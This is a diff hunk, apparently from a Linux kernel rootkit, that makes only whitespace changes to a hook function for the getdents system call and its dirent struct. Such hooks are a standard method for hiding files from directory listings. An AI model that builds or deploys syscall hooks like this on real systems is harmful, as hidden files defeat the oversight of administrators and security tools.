@@ -14,16 +14,16 @@ void *_getdents64 = NULL;
 struct linux_dirent {
   uint64_t d_ino;
   uint64_t d_off;
-  uint16_t  d_reclen;
-  char    d_name[];
+  uint16_t d_reclen;
+  char     d_name[];
 };
 
 asmlinkage int64_t h_getdents(const struct pt_regs *r) {
   struct linux_dirent *dirl = NULL, *cur = NULL, *prev = NULL;
-  char                  *_fd_path = NULL, *fd_path = NULL, *cur_path = NULL;
-  int64_t                ret = 0, pos = 0;
-  uint32_t               fd = r->di;
-  struct path            path;
+  char                *_fd_path = NULL, *fd_path = NULL, *cur_path = NULL;
+  int64_t              ret = 0, pos = 0;
+  uint32_t             fd = r->di;
+  struct path          path;
 
   hfind(_getdents, "__x64_sys_getdents");
   hsyscall(_getdents);
@@ -103,7 +103,7 @@ end:
 }
 
 /*
- 
+
  * exactly same with h_getdents, only difference is that it uses linux_dirent64
  * and obv the original calls/hooked symbol is different
 
